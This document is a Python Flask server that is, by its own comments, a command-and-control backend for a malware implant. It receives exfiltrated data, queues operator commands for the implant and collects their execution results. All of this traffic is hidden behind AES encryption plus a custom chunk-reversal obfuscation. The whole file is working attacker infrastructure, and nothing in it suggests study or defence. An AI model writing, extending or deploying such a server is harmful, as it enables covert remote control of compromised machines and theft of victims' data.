from flask import Flask, request, jsonify
import base64

from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import padding
import os
import base64
import hashlib

BLOCK_SIZE = 16
KEY = "your_secret_key_here"  # Replace with your actual key

# function that does AES encryption and then obfuscation
def do_everything(data):
    encrypted_data = aes_encrypt(data, KEY)
    obfuscated_data = obfuscate(encrypted_data)
    return obfuscated_data

# function that does AES decryption and then deobfuscation
def undo_everything(data):
    deobfuscated_data = deobfuscate(data)
    decrypted_data = aes_decrypt(deobfuscated_data, KEY)
    return decrypted_data

def aes_encrypt(plaintext, key):
    key_bytes = hashlib.sha256(key.encode()).digest()[:16]
    iv = os.urandom(BLOCK_SIZE)

    # PKCS7 padding
    padder = padding.PKCS7(128).padder()
    padded_data = padder.update(plaintext.encode()) + padder.finalize()

    cipher = Cipher(algorithms.AES(key_bytes), modes.CBC(iv), backend=default_backend())
    encryptor = cipher.encryptor()
    encrypted = encryptor.update(padded_data) + encryptor.finalize()

    return base64.b64encode(iv + encrypted).decode()

def aes_decrypt(ciphertext_b64, key):
    key_bytes = hashlib.sha256(key.encode()).digest()[:16]
    raw = base64.b64decode(ciphertext_b64)
    iv = raw[:BLOCK_SIZE]
    encrypted = raw[BLOCK_SIZE:]

    cipher = Cipher(algorithms.AES(key_bytes), modes.CBC(iv), backend=default_backend())
    decryptor = cipher.decryptor()
    padded_data = decryptor.update(encrypted) + decryptor.finalize()

    unpadder = padding.PKCS7(128).unpadder()
    plaintext = unpadder.update(padded_data) + unpadder.finalize()

    return plaintext.decode()


def obfuscate(text):
    """Obfuscate text by first base64‑encoding it, then splitting into 16‑character chunks,
    padding the last chunk with '@' if needed, and reversing the order of chunks."""
    b64_text = base64.b64encode(text.encode()).decode()
    chunk_size = 16
    chunks = [b64_text[i:i+chunk_size] for i in range(0, len(b64_text), chunk_size)]
    if chunks and len(chunks[-1]) < chunk_size:
        chunks[-1] = chunks[-1].ljust(chunk_size, '@')
    return ''.join(reversed(chunks))

def deobfuscate(obf_str):
    """Reverse the obfuscation: split into 16‑character chunks, reverse order,
    and remove trailing '@' from the final chunk."""
    chunk_size = 16
    chunks = [obf_str[i:i+chunk_size] for i in range(0, len(obf_str), chunk_size)]
    chunks = list(reversed(chunks))
    if chunks:
        chunks[-1] = chunks[-1].rstrip('@')
    ordered_chunks = ''.join(chunks)
    return base64.b64decode(ordered_chunks.encode()).decode()


app = Flask(__name__)
COMMAND_FILE = "command.txt"

@app.route('/upload', methods=['POST'])
def upload():
    # Receive encrypted, obfuscated data from the implant.
    encrypted_data = request.form.get('data')
    if encrypted_data:
        try:
            decrypted_data = undo_everything(encrypted_data)
            print("Received exfiltrated data:")
            print(decrypted_data)
        except Exception as e:
            print("Error processing exfiltrated data:", e)
        return jsonify({"status": "success"}), 200
    else:
        return jsonify({"status": "no data received"}), 400

@app.route('/command', methods=['GET'])
def get_command():
    try:
        with open(COMMAND_FILE, "r") as f:
            cmd = f.read().strip()
        # Clear the command file immediately after reading.
        with open(COMMAND_FILE, "w") as f:
            f.write("")
        if cmd:
            secret_cmd = do_everything(cmd)
            return jsonify({"data": secret_cmd}), 200
        else:
            return jsonify({"data": ""}), 200
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/result', methods=['POST'])
def result():
    secret_res = request.form.get('data')
    if secret_res:
        res = undo_everything(secret_res)
        print("Received command execution result:")
        print(res)
        return jsonify({"status": "result received"}), 200
    else:
        return jsonify({"status": "no result received"}), 400

if __name__ == '__main__':
    # Run over HTTPS with cert.pem and key.pem in the same directory.
    app.run(host='0.0.0.0', port=8080, ssl_context=('cert.pem', 'key.pem'))
